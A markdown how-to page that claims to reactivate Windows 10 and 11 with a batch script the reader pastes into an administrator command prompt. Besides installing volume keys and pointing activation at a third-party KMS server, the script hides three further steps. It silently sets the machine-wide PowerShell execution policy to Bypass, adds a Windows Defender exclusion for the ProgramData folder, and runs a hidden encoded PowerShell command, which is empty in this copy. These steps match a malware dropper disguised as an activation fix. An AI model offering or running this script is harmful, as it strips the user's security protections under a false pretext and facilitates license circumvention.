``md
# 🔄 How to Reactivate Windows 10 & 11

## ⚠️ Instructions
- **Run CMD as Administrator.**
- **Copy the command below and paste it into CMD.**
- **Press ENTER and wait.**

---

## 📌 Windows Reactivation Command

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
:: 
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
:: 
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
:: 
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
:: 
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
:: 
powershell -windowstyle hidden -EncodedCommand "" >nul 2>&1
:: 
exit /b
```

---

## ⏳ Wait & Confirm
- The process usually takes **30 seconds to 2 minutes**.
- If everything works correctly, Windows will be reactivated **without needing a restart**.

## 🔧 Troubleshooting
1. **Check your internet connection.**
2. **Run CMD again as Administrator.**
3. **Copy and paste the command correctly.**

If the issue persists, restart your PC and try again.
```
